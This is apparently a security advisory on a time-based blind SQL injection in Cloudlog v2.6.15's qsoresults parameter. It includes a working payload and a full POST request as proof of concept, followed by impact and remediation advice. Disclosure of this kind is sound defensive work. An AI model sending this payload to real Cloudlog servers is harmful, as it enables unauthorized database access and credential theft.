# SQL injection in Cloudlog v2.6.15 - qsoresults parameter


A time-based blind SQL Injection vulnerability has been identified in the **Cloudlog v2.6.15 platform**, at the endpoint /index.php/logbookadvanced/search, through the qsoresults parameter . This vulnerability allows a malicious user to execute arbitrary SQL commands on the MySQL database, compromising the security of the system.

# Vulnerable endpoint:

URL: /index.php/logbookadvanced/search

Method: POST

Vulnerable parameter: qsoresults


# Vulnerability Details:

The vulnerability exploits an SQL injection to force the execution of an SQL function (such as BENCHMARK or EXTRACTVALUE), deliberately slowing down the system to confirm the existence of the vulnerability.


Payload:

**qsoresults=250 PROCEDURE ANALYSE(EXTRACTVALUE(1073,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x65636f70))))),1)**


 
**Malicious HTTP Request:**

POST /index.php/logbookadvanced/search HTTP/1.1

Host: localhost

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Content-Length: 104


qsoresults=250 PROCEDURE ANALYSE(EXTRACTVALUE(1073,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x65636f70))))),1)



# Impact:
An attacker can exploit this vulnerability to:
Execute arbitrary SQL queries, potentially extracting sensitive data.
Compromise database integrity.
Gain unauthorized access to critical data such as user credentials.

# Recommended Solution:
Input Validation: Implement strict input sanitization for the qsoresults parameter .
Parameterized Queries: Use parameterized queries to prevent user injection of SQL commands.
Permission Restriction: Restrict the privileges of the database user used by the application.
Web Application Firewall (WAF): Implement a WAF to monitor and block SQL injection attempts.




